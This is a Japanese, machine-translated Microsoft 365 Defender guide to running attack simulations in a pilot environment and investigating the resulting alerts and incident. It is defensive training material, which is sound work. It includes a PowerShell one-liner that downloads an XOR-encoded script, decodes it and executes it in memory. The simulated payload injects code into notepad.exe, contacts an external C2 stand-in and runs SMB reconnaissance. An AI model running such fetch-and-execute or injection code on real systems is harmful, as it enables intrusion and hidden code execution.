---
title: Microsoft 365 Defenderパイロット環境で攻撃シミュレーションを実行する
description: Microsoft 365 Defenderの攻撃シミュレーションを実行して、アラートとインシデントがどのように表示され、分析情報が得られ、脅威が迅速に修復されるかを確認します。
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.date: 07/09/2021
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-scenario
- m365solution-pilotmtpproject
- zerotrust-solution
ms.custom: admindeeplinkDEFENDER
ms.topic: conceptual
ms.technology: m365d
ms.openlocfilehash: db3a005b80a69695da5936d60cb512b8fc46cfcb
ms.sourcegitcommit: d09eb780dc41a01796eb8137fbe9267231af6746
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 08/19/2022
ms.locfileid: "67387069"
---
# <a name="run-an-attack-simulation-in-a-microsoft-365-defender-pilot-environment"></a>Microsoft 365 Defenderパイロット環境で攻撃シミュレーションを実行する


この記事は、パイロット環境を使用してMicrosoft 365 Defenderでインシデントの調査と対応を実行するプロセスの[手順 1/2](eval-defender-investigate-respond.md) です。 このプロセスの詳細については、 [概要](eval-defender-investigate-respond.md) に関する記事を参照してください。

[パイロット環境](eval-defender-investigate-respond.md)を準備したら、シミュレートされた攻撃でインシデントを作成し、Microsoft 365 Defender ポータルを使用して調査と対応を行うことで、Microsoft 365 Defenderのインシデント対応と自動調査と修復機能をテストします。

Microsoft 365 Defenderのインシデントは、攻撃のストーリーを構成する相関アラートと関連データのコレクションです。

Microsoft 365 サービスおよびアプリは、疑わしい、または悪意のあるイベントやアクティビティを検出した場合にアラートを作成します。 個々のアラートは、完了した攻撃、または進行中の攻撃に関する貴重な手がかりとなります。 ただし、攻撃は通常、デバイス、ユーザー、メールボックスなどの異なる種類のエンティティに対抗してさまざまな技術を採用しています。 その結果、テナント内の複数のエンティティに複数のアラートが表示されます。

>[!Note]
>セキュリティ分析とインシデント対応をまったく初めて使用する場合は、「 [最初のインシデントに対応する」チュートリアル](first-incident-overview.md) を参照して、分析、修復、インシデント後のレビューの一般的なプロセスのガイド付きツアーを入手してください。
>

## <a name="simulate-attacks-with-the-microsoft-365-defender-portal"></a>Microsoft 365 Defender ポータルで攻撃をシミュレートする

Microsoft 365 Defender ポータルには、パイロット環境に対するシミュレートされた攻撃を作成するための機能が組み込まれています。

- Office 365のMicrosoft 365 Defenderの攻撃シミュレーション トレーニング[https://security.microsoft.com/attacksimulator](https://security.microsoft.com/attacksimulator)
  
  Microsoft 365 Defender ポータルで、**コラボレーション > 攻撃シミュレーション トレーニングEmail &** 選択します。

- 攻撃のチュートリアルでは、エンドポイントのMicrosoft 365 Defenderのシミュレーションを&します[https://security.microsoft.com/tutorials/simulations](https://security.microsoft.com/tutorials/simulations)。

  <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender ポータル</a>で、[**Endpoints > Tutorials & simulations**] を選択します。

### <a name="defender-for-office-365-attack-simulation-training"></a>Defender for Office 365 攻撃シミュレーション トレーニング

Microsoft 365 E5またはMicrosoft Defender for Office 365プラン 2 のDefender for Office 365には、フィッシング攻撃に対する攻撃シミュレーション トレーニングが含まれています。 基本的な手順は次のとおりです。

1. シミュレーションを作成する

   新しいシミュレーションを作成して起動する方法の詳細な手順については、「 [フィッシング攻撃をシミュレートする](/microsoft-365/security/office-365-security/attack-simulation-training)」を参照してください。

2. ペイロードを作成する

   シミュレーション内で使用するペイロードを作成する方法の詳細な手順については、「 [攻撃シミュレーション トレーニング用のカスタム ペイロードを作成する](/microsoft-365/security/office-365-security/attack-simulation-training-payloads)」を参照してください。

3. 分析情報を取得する

   レポートを使用して分析情報を取得する方法の詳細な手順については、「 [攻撃シミュレーション トレーニングを通じて分析情報を取得する](/microsoft-365/security/office-365-security/attack-simulation-training-insights)」を参照してください。

   > [!VIDEO https://www.microsoft.com/videoplayer/embed/RWMhvB]

詳細については、「 [シミュレーション](/microsoft-365/security/office-365-security/attack-simulation-training-get-started#simulations)」を参照してください。

### <a name="defender-for-endpoint-attack-tutorials--simulations"></a>Defender for Endpoint 攻撃のチュートリアル&シミュレーション

Microsoft からの Defender for Endpoint シミュレーションを次に示します。

- ドキュメントがバックドアを削除する
- 自動調査 (バックドア)

サード パーティのソースからの追加のシミュレーションがあります。 一連のチュートリアルもあります。

シミュレーションまたはチュートリアルごとに、

1. 提供されている対応するウォークスルー ドキュメントをダウンロードして読み取ります。

2. シミュレーション ファイルをダウンロードします。 テスト デバイスでファイルまたはスクリプトをダウンロードすることもできますが、必須ではありません。

3. チュートリアル ドキュメントの指示に従って、テスト デバイスでシミュレーション ファイルまたはスクリプトを実行します。

 詳細については、「[シミュレートされた攻撃によるエクスペリエンス Microsoft Defender for Endpoint」を](/microsoft-365/security/defender-endpoint/attack-simulations)参照してください。

## <a name="simulate-an-attack-with-an-isolated-domain-controller-and-client-device-optional"></a>分離されたドメイン コントローラーとクライアント デバイスを使用して攻撃をシミュレートする (省略可能)

このオプションのインシデント対応演習では、PowerShell スクリプトを使用して分離されたActive Directory Domain Services (AD DS) ドメイン コントローラーと Windows デバイスに対する攻撃をシミュレートし、インシデントを調査、修復、解決します。

まず、パイロット環境にエンドポイントを追加する必要があります。

### <a name="add-pilot-environment-endpoints"></a>パイロット環境エンドポイントを追加する

まず、分離された AD DS ドメイン コントローラーと Windows デバイスをパイロット環境に追加する必要があります。

1. パイロット環境テナントで[Microsoft 365 Defenderが有効](m365d-enable.md#confirm-that-the-service-is-on)になっていることを確認します。

2. ドメイン コントローラーを確認します。

   - Windows Server 2008 R2 以降のバージョンを実行します。
   - [レポートをMicrosoft Defender for Identity](/azure/security-center/security-center-wdatp)し、[リモート管理](/windows-server/administration/server-manager/configure-remote-management-in-server-manager)が有効になっています。
   - [Microsoft Defender for IdentityとMicrosoft Defender for Cloud Apps統合](/cloud-app-security/mdi-integration)が有効になっています。
   - テスト ドメインにテスト ユーザーが作成されました。 管理者レベルのアクセス許可は必要ありません。

3. テスト デバイスを確認します。

   - バージョン 1903 以降Windows 10実行します。
   - AD DS ドメイン コントローラー ドメインに参加しています。
   - [Microsoft Defender ウイルス対策](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features)が有効になっています。 Microsoft Defender ウイルス対策を有効にできない場合は、この [トラブルシューティング トピックを](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-microsoft-defender-antivirus-is-not-disabled-by-a-policy)参照してください。
   - [Microsoft Defender for Endpointにオンボードされます](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints)。

テナントとデバイス グループを使用する場合は、テスト デバイス用の専用デバイス グループを作成し、それを最上位レベルにプッシュします。

1 つの代替手段として、MICROSOFT Azure インフラストラクチャ サービスで AD DS ドメイン コントローラーをホストし、仮想マシンとしてデバイスをテストします。 [シミュレートされたエンタープライズ テスト ラボ ガイドのフェーズ 1 の手順を](/microsoft-365/enterprise/simulated-ent-base-configuration-microsoft-365-enterprise#phase-1-create-a-simulated-intranet)使用できますが、APP1 仮想マシンの作成はスキップしてください。

結果を次に示します。

:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png" alt-text="シミュレートされたエンタープライズ テスト ラボ ガイドを使用した評価環境" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-endpoints-tlg.png":::

高度な手法を利用して検出から隠れる高度な攻撃をシミュレートします。 この攻撃により、ドメイン コントローラーで開かれたサーバー メッセージ ブロック (SMB) セッションが列挙され、ユーザーのデバイスの最近の IP アドレスが取得されます。 攻撃のこのカテゴリには、通常、被害者のデバイスにドロップされたファイルは含まれず、メモリ内でのみ発生します。 既存のシステムツールと管理ツールを使用して"陸から離れた場所に住む" と、コードをシステム プロセスに挿入して実行を非表示にします。 このような動作により、検出を回避し、デバイスに永続化できます。

このシミュレーションでは、サンプル シナリオは PowerShell スクリプトから始まります。 実際の世界では、ユーザーがスクリプトの実行をだまされたり、以前に感染したデバイスから別のコンピューターへのリモート接続からスクリプトが実行されたりする可能性があります。これは、攻撃者がネットワーク内を横方向に移動しようとしていることを示しています。 管理者はさまざまな管理アクティビティを実行するためにリモートでスクリプトを実行することも多いため、これらのスクリプトの検出は困難な場合があります。

:::image type="content" source="../../media/mtp/mtpdiydiagram.png" alt-text="プロセスインジェクションと SMB 偵察攻撃を伴う Fileless PowerShell 攻撃" lightbox="../../media/mtp/mtpdiydiagram.png":::

シミュレーション中、攻撃はシェルコードを一見無実のプロセスに挿入します。 このシナリオでは、notepad.exeを使用する必要があります。 シミュレーションにこのプロセスを選択しましたが、攻撃者はsvchost.exeなどの長時間実行されるシステム プロセスをターゲットにする可能性が高くなります。 その後、シェルコードは攻撃者のコマンドアンドコントロール (C2) サーバーに連絡し、続行方法の指示を受け取ります。 スクリプトは、ドメイン コントローラー (DC) に対する偵察クエリの実行を試みます。 偵察により、攻撃者は最近のユーザー ログイン情報に関する情報を取得できます。 攻撃者がこの情報を取得したら、ネットワーク内を横方向に移動して、特定の機密性の高いアカウントにアクセスできます。

> [!IMPORTANT]
> 最適な結果を得るには、攻撃シミュレーションの指示にできるだけ近い手順に従ってください。

### <a name="run-the-isolated-ad-ds-domain-controller-attack-simulation"></a>分離された AD DS ドメイン コントローラーの攻撃シミュレーションを実行する

攻撃シナリオ シミュレーションを実行するには:

1. パイロット環境に分離された AD DS ドメイン コントローラーと Windows デバイスが含まれていることを確認します。

2. テスト ユーザー アカウントを使用してテスト デバイスにサインインします。

3. テスト デバイスでWindows PowerShell ウィンドウを開きます。

4. 次のシミュレーション スクリプトをコピーします。

   ```powershell
   [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor
   = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI "https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt"
   -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
   $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
   $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
   ```

   > [!NOTE]
   > この記事を Web ブラウザーで開くと、特定の文字を失ったり、改行を追加したりすることなく、フル テキストをコピーする際に問題が発生する可能性があります。 このような場合は、このドキュメントをダウンロードし、Adobe Reader で開きます。

5. コピーしたスクリプトを PowerShell ウィンドウに貼り付けて実行します。

> [!NOTE]
> リモート デスクトップ プロトコル (RDP) を使用して PowerShell を実行している場合は、 **CTRL-V** ホットキーまたは右クリック貼り付けメソッドが機能しない可能性があるため、RDP クライアントで [クリップボードテキストの入力] コマンドを使用します。 最近のバージョンの PowerShell では、そのメソッドが受け入れられません。最初にメモリ内のメモ帳にコピーし、仮想マシンでコピーしてから PowerShell に貼り付ける必要がある場合があります。

数秒後、メモ帳アプリが開きます。 シミュレートされた攻撃コードがメモ帳に挿入されます。 自動的に生成されたメモ帳インスタンスを開いたままにして、完全なシナリオを体験します。

シミュレートされた攻撃コードは、外部 IP アドレスとの通信 (C2 サーバーのシミュレート) を試み、SMB を介してドメイン コントローラーに対する偵察を試みます。

このスクリプトが完了すると、PowerShell コンソールに次のメッセージが表示されます。

```console
ran NetSessionEnum against [DC Name] with return code result 0
```

自動インシデントと応答機能の動作を確認するには、notepad.exe プロセスを開いたままにします。 メモ帳プロセスを停止する自動インシデントと応答が表示されます。

### <a name="investigate-the-incident-for-the-simulated-attack"></a>シミュレートされた攻撃のインシデントを調査する

> [!NOTE]
> このシミュレーションについて説明する前に、次のビデオを参照して、インシデント管理が調査プロセスの一環として関連するアラートをまとめ、ポータルで見つける方法、およびセキュリティ操作にどのように役立つかを確認します。

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bzwz?]

SOC アナリストの観点に切り替えると、Microsoft 365 Defender ポータルで攻撃の調査を開始できるようになりました。

1. <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender ポータル</a>を開きます。

2. ナビゲーション ウィンドウで、[インシデント] **& [アラート] > [インシデント]** を選択します。

3. シミュレートされた攻撃の新しいインシデントがインシデント キューに表示されます。

   :::image type="content" source="../../media/mtp/fig2.png" alt-text="インシデント キューの例" lightbox="../../media/mtp/fig2.png":::

#### <a name="investigate-the-attack-as-a-single-incident"></a>1 つのインシデントとして攻撃を調査する

Microsoft 365 Defenderは分析を関連付け、関連するすべてのアラートと調査を異なる製品から 1 つのインシデント エンティティに集約します。 これにより、Microsoft 365 Defenderは広範な攻撃ストーリーを示し、SOC アナリストは複雑な脅威を理解して対応できます。

このシミュレーション中に生成されたアラートは同じ脅威に関連付けられます。その結果、1 つのインシデントとして自動的に集計されます。

インシデントを表示するには:

1. <a href="https://go.microsoft.com/fwlink/p/?linkid=2077139" target="_blank">Microsoft 365 Defender ポータル</a>を開きます。

2. ナビゲーション ウィンドウで、[インシデント] **& [アラート] > [インシデント]** を選択します。

3. インシデント名の左側にある円をクリックして、最新のアイテムを選択します。 サイド パネルには、関連するすべてのアラートを含む、インシデントに関する追加情報が表示されます。 各インシデントには、含まれるアラートの属性に基づいて説明する一意の名前が付けられます。

   ダッシュボードに表示されるアラートは、サービス リソース (Microsoft Defender for Identity、Microsoft Defender for Cloud Apps、Microsoft Defender for Endpoint、Microsoft 365 Defender、およびMicrosoft Defender for Office 365。

3. [ **インシデントを開く] ページ** を選択して、インシデントの詳細を確認します。

   [ **インシデント]** ページには、インシデントに関連するすべてのアラートと情報が表示されます。 この情報には、アラートに関連するエンティティと資産、アラートの検出ソース (Microsoft Defender for IdentityやMicrosoft Defender for Endpointなど)、およびそれらがリンクされた理由が含まれます。 インシデント アラートリストを確認すると、攻撃の進行が示されます。 このビューから、個々のアラートを確認して調査できます。

   また、右側のメニューから [ **インシデントの管理** ] をクリックして、インシデントにタグを付け、自分に割り当て、コメントを追加することもできます。

#### <a name="review-generated-alerts"></a>生成されたアラートを確認する

シミュレートされた攻撃中に生成されたアラートの一部を見てみましょう。

> [!NOTE]
> シミュレートされた攻撃の間に生成されたアラートのほんの一部について説明します。 テスト デバイスで実行されている Windows のバージョンとMicrosoft 365 Defender製品によっては、少し異なる順序で表示されるアラートがさらに表示される場合があります。

:::image type="content" source="../../media/mtp/fig6.png" alt-text="生成されたアラートの例" lightbox="../../media/mtp/fig6.png":::

##### <a name="alert-suspicious-process-injection-observed-source-microsoft-defender-for-endpoint"></a>アラート: 疑わしいプロセスインジェクションが観察されました (ソース: Microsoft Defender for Endpoint)

高度な攻撃者は、高度で密な方法を使用してメモリ内に保持し、検出ツールから隠します。 一般的な手法の 1 つは、悪意のある実行可能ファイルではなく、信頼されたシステム プロセス内で動作するため、検出ツールやセキュリティ操作で悪意のあるコードを見つけるのが困難です。

SOC アナリストがこれらの高度な攻撃をキャッチできるように、Microsoft Defender for Endpointのディープ メモリ センサーは、さまざまなクロスプロセス コードインジェクション手法を前例のない可視性でクラウド サービスに提供します。 次の図は、notepad.exeにコードを挿入しようとしたときに Defender for Endpoint が検出され、警告された <i> 方法を示 </i>しています。

:::image type="content" source="../../media/mtp/fig7.png" alt-text="悪意のある可能性のあるコードの挿入に関するアラートの例" lightbox="../../media/mtp/fig7.png":::

##### <a name="alert-unexpected-behavior-observed-by-a-process-run-with-no-command-line-arguments-source-microsoft-defender-for-endpoint"></a>アラート: コマンド ライン引数なしで実行されるプロセスによって観察される予期しない動作 (ソース: Microsoft Defender for Endpoint)

Microsoft Defender for Endpoint検出は、多くの場合、攻撃手法の最も一般的な属性を対象とします。 この方法により、持続性が確保され、攻撃者が新しい戦術に切り替える際のバーが発生します。

大規模な学習アルゴリズムを使用して、組織内および世界中の一般的なプロセスの通常の動作を確立し、これらのプロセスが異常な動作を示すタイミングを監視します。 これらの異常な動作は、多くの場合、余分なコードが導入され、それ以外の場合は信頼されたプロセスで実行されていることを示します。

このシナリオでは、 <i> プロセスnotepad.exe</i> が異常な動作を示し、外部の場所との通信が関係しています。 この結果は、悪意のあるコードの導入と実行に使用される特定の方法とは無関係です。

> [!NOTE]
> このアラートは、追加のバックエンド処理を必要とする機械学習モデルに基づいているため、ポータルにこのアラートが表示されるまでに時間がかかる場合があります。

アラートの詳細には、外部 IP アドレスが含まれていることに注意してください。これは、調査を展開するためのピボットとして使用できるインジケーターです。

アラート プロセス ツリーで IP アドレスを選択して、IP アドレスの詳細ページを表示します。

:::image type="content" source="../../media/mtp/fig8.png" alt-text="コマンド ライン引数なしで実行されるプロセスによる予期しない動作の例" lightbox="../../media/mtp/fig8.png":::

次の図は、選択した IP アドレスの詳細ページを表示します (アラート プロセス ツリーで IP アドレスをクリックします)。

:::image type="content" source="../../media/mtp/fig9.png" alt-text="[IP アドレスの詳細] ページの例" lightbox="../../media/mtp/fig9.png":::

##### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a>アラート: ユーザーと IP アドレスの偵察 (SMB) (ソース: Microsoft Defender for Identity)

サーバー メッセージ ブロック (SMB) プロトコルを使用した列挙により、攻撃者は、特定の機密性の高いアカウントにアクセスするためにネットワークを横方向に移動するのに役立つ最近のユーザー ログオン情報を取得できます。

この検出では、SMB セッション列挙がドメイン コントローラーに対して実行されると、アラートがトリガーされます。

:::image type="content" source="../../media/mtp/fig10.png" alt-text="ユーザーと IP アドレスの偵察に対するMicrosoft Defender for Identityアラートの例" lightbox="../../media/mtp/fig10.png":::

#### <a name="review-the-device-timeline-with-microsoft-defender-for-endpoint"></a>Microsoft Defender for Endpointを使用してデバイスのタイムラインを確認する

このインシデントのさまざまなアラートを調べた後、前に調査したインシデント ページに戻ります。 [インシデント] ページの [**デバイス**] タブを選択して、Microsoft Defender for EndpointとMicrosoft Defender for Identityによって報告されたこのインシデントに関連するデバイスを確認します。

攻撃が行われたデバイスの名前を選択して、その特定のデバイスのエンティティ ページを開きます。 そのページには、トリガーされたアラートと関連するイベントが表示されます。

[ **タイムライン** ] タブを選択すると、デバイスのタイムラインが開き、発生したアラートと一緒にデバイスで観察されたすべてのイベントと動作が時系列順に表示されます。

:::image type="content" source="../../media/mtp/fig11.png" alt-text="動作を含むデバイス タイムラインの例" lightbox="../../media/mtp/fig11.png":::

より興味深い動作の一部を展開すると、プロセス ツリーなどの有用な詳細が提供されます。

たとえば、アラート イベント **の疑わしいプロセスインジェクションが観察** されるまで下にスクロールします。 その下の **プロセス イベントnotepad.exe挿入するpowershell.exe** を選択すると、この動作の完全なプロセス ツリーがサイド ウィンドウの **[イベント エンティティ** ] グラフに表示されます。 必要に応じて、検索バーを使用してフィルター処理を行います。

:::image type="content" source="../../media/mtp/fig12.png" alt-text="選択した PowerShell ファイル作成動作のプロセス ツリーの例" lightbox="../../media/mtp/fig12.png":::

#### <a name="review-the-user-information-with-microsoft-defender-for-cloud-apps"></a>Microsoft Defender for Cloud Appsを使用してユーザー情報を確認する

インシデント ページで、[ **ユーザー** ] タブを選択して、攻撃に関与したユーザーの一覧を表示します。 この表には、各ユーザーの **調査優先度** スコアなど、各ユーザーに関する追加情報が含まれています。

ユーザー名を選択してユーザーのプロファイル ページを開き、さらに調査を行うことができます。 [リスクの高いユーザーの調査について詳しくは、こちらをご覧ください](/cloud-app-security/tutorial-ueba#identify)。

:::image type="content" source="../../media/mtp/fig13.png" alt-text="Defender for Cloud Apps ユーザー ページ" lightbox="../../media/mtp/fig13.png":::

#### <a name="automated-investigation-and-remediation"></a>調査と修復の自動化

> [!NOTE]
>このシミュレーションについて説明する前に、次のビデオを見て、自動自己修復とは何か、ポータルで見つける場所、セキュリティ操作にどのように役立つかを理解してください。

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

Microsoft 365 Defender ポータルでインシデントに戻ります。 [**インシデント**] ページ **の [調査**] タブには、Microsoft Defender for IdentityとMicrosoft Defender for Endpointによってトリガーされた自動調査が表示されます。 次のスクリーンショットは、Defender for Endpoint によってトリガーされた自動調査のみを示しています。 既定では、Defender for Endpoint はキュー内で見つかったアーティファクトを自動的に修復します。修復が必要です。

:::image type="content" source="../../media/mtp/fig14.png" alt-text="インシデントに関連する自動調査の例" lightbox="../../media/mtp/fig14.png":::

調査をトリガーしたアラートを選択して、[調査の **詳細** ] ページを開きます。 次の詳細が表示されます。

- 自動調査をトリガーしたアラート。
- 影響を受けたユーザーとデバイス。 インジケーターが追加のデバイスで見つかった場合は、これらの追加デバイスも一覧表示されます。
- 証拠の一覧。 ファイル、プロセス、サービス、ドライバー、ネットワーク アドレスなど、検出および分析されたエンティティ。 これらのエンティティは、アラートとの可能な関係について分析され、無害または悪意のあるものとして評価されます。
- 見つかった脅威。 調査中に検出された既知の脅威。

> [!NOTE]
> タイミングによっては、自動調査がまだ実行されている可能性があります。 プロセスが完了するまで数分待ってから、証拠を収集して分析し、結果を確認します。 **[調査の詳細**] ページを更新して、最新の結果を取得します。

:::image type="content" source="../../media/mtp/fig15.png" alt-text="[調査の詳細] ページの例" lightbox="../../media/mtp/fig15.png":::

自動調査中に、Microsoft Defender for Endpoint修復が必要な成果物の 1 つとして挿入されたnotepad.exe プロセスを特定しました。 Defender for Endpoint は、自動修復の一環として疑わしいプロセスインジェクションを自動的に停止します。

テスト デバイスで実行中のプロセスの一覧 <i> からnotepad.exe消 </i> えることがわかります。

#### <a name="resolve-the-incident"></a>インシデントを解決する

調査が完了し、修復が確認されたら、インシデントを解決します。

[ **インシデント** ] ページで、[ **インシデントの管理**] を選択します。 状態を **[インシデントの解決]** に設定し、判定の分類と **セキュリティ テスト** で **[True alert**] を選択します。

:::image type="content" source="../../media/mtp/fig16.png" alt-text="インシデントを解決するためにスイッチをクリックできる[インシデントの管理] パネルを開いたインシデント ページの例" lightbox="../../media/mtp/fig16.png":::

インシデントが解決されると、Microsoft 365 Defender ポータルと関連ポータルで関連付けられているすべてのアラートが解決されます。

これにより、インシデント分析、自動調査、インシデント解決のための攻撃シミュレーションがまとめられます。

## <a name="next-step"></a>次のステップ

[:::image type="content" source="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png" alt-text="Microsoft 365 Defenderインシデント対応機能" lightbox="../../media/eval-defender-investigate-respond/eval-defender-eval-investigate-respond-step2.png":::](eval-defender-investigate-respond-additional.md)

手順 2/2: [インシデント対応機能Microsoft 365 Defender試す](eval-defender-investigate-respond-additional.md)

### <a name="navigation-you-may-need"></a>必要なナビゲーション

[Microsoft 365 Defender評価環境を作成する](eval-create-eval-environment.md)
